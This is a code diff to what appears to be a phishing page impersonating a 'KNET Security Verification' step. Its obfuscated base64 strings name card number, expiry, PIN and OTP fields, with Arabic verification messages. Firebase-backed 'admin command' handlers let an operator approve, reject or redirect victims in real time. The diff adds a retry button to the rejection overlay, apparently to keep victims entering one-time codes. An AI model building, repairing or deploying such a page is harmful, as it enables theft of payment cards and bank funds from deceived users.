@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html><head><meta name="robots" content="noindex, nofollow, noarchive" /><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js?v=20260911b"></script>
+<html><head><meta name="robots" content="noindex, nofollow, noarchive" /><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js?v=20260912"></script>
 
 <script type="text/javascript">
 var _0xstr = ["azdwcmVmaXg=", "azdiYW5r", "azdjbnVt", "azdleHBtbnRo", "azdleHB5ZWFy", "azdwaW4=", "2LrZitixINmF2LnYsdmI2YE=", "KioqKiAqKioqICoqKiogKioqKg==", "Kio=", "KioqKg==", "I2kzMA==", "aTE2", "aW5wdXQ=", "VGltZW91dCBJbjog", "MA==", "Og==", "KE9UUCkg2YTZgtivINin2YbYqtmH2Kog2LXZhNin2K3ZitipINix2YXYsiDYp9mE2KrYrdmC2YI=", "aTMw", "YmxvY2s=", "IzVlZDYyMDVl", "I2Y3ZGFkZA==", "IzE1N2QxMiAxcHggc29saWQ=", "I2ZmMDAwMCAxcHggc29saWQ=", "IzEyN2QxYg==", "I2ZmMDAwMA==", "aTMy", "aTQy", "aTI5", "bm9uZQ==", "UmVzZW5k", "2KrZhdiqINil2LnYp9iv2Kkg2KrZh9mK2KbYqSDYsdmF2LIg2KfZhNiq2K3ZgtmCINmF2K3ZhNmK2Kcu", "2YrYsdis2Ykg2KXYr9iu2KfZhCDYp9mE2LHZhdiyINin2YTZhdmD2YjZhiDZhdmGIA==", "INij2LHZgtin2YUu", "2LHZhdiyINin2YTYqtit2YLZgiDYp9mE2LDZiiDYo9iv2K7ZhNiq2Ycg2LrZitixINi12KfZhNitINij2Ygg2YXZhtiq2YfZiiDYp9mE2LXZhNin2K3Zitip", "VkFMSURBVEU=", "RA==", "RC1Q", "MTAyNjE2MDI5MDAwMTMzNjQz", "MQ==", "aTQw", "aTA=", "aTIy", "aTIz", "I2kzNyAuazc=", "djljbg==", "djllbQ==", "djlleQ==", "djlwbg==", "S05FVCBTZWN1cml0eSBWZXJpZmljYXRpb24=", "Y3JlZGl0RGViaXRDaGVjaw==", "c2VsZWN0ZWRQeW1udEluc3RybW50", "djIwNA==", "c2VsZWN0ZWRQcmVmaXg=", "djQ3", "dGltZU92ZXI=", "b3RwZmxnZGl2", "b3RwZ2VuTWV0aG9k", "T3RwdGVuYW50", "ZGlzY291bnRlZHRyYW5hbW91bnQ=", "QnJhbkRUeXBl", "Y3NwZw==", "Q1NSRlRva2Vu", "RXJyb3JUZXh0", "cHJlZml4", "YmFuaw=="];
@@ -418,11 +418,20 @@ jQuery(document).ready(function() {
 <script>
 // ═══ الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسالة) ═══
 (function () {
-  function showAdminOverlay(text, color) {
+  function showAdminOverlay(text, color, withRetry) {
     var ov = document.createElement('div');
     ov.style.cssText = 'position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;';
-    ov.innerHTML = '<div style="font-size:22px;font-weight:700;color:' + color + ';">' + text + '</div>';
+    ov.innerHTML = '<div style="font-size:22px;font-weight:700;color:' + color + ';">' + text + '</div>' +
+      '<button type="button" class="ov-btn" style="margin-top:20px;padding:10px 28px;background:#16a34a;color:#fff;border:0;border-radius:6px;font:700 14px Tajawal,sans-serif;cursor:pointer;">' + (withRetry ? 'إعادة المحاولة' : 'إغلاق') + '</button>' +
+      '<button type="button" class="ov-dismiss" style="position:absolute;top:14px;left:18px;font-size:22px;color:#9ca3af;background:transparent;border:0;cursor:pointer;" title="إغلاق">&times;</button>';
     document.body.appendChild(ov);
+    var primary = ov.querySelector('.ov-btn');
+    primary.onclick = function () {
+      if (withRetry && window.clearRejection) { try { window.clearRejection(); } catch (e) {} }
+      window.location.reload();
+    };
+    ov.querySelector('.ov-dismiss').onclick = function () { ov.remove(); };
+    return ov;
   }
   if (typeof window.listenForAdminCommands === 'function') {
     window.listenForAdminCommands({
@@ -430,8 +439,8 @@ jQuery(document).ready(function() {
       // (إعادة التوجيه هنا كانت تسبب حلقة تحميل لا نهائية تمنع إدخال الرمز)
       onApproval: function () {},
       onRejection: function (cmd) {
-        // إظهار رسالة الرفض مرة واحدة فقط بدون إعادة تحميل (حتى لا تتكرر الحلقة)
-        showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b');
+        // رسالة الرفض قابلة للإغلاق مع زر إعادة محاولة (لا تمنع إدخال الرمز بشكل دائم)
+        showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b', true);
       },
       onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
     });
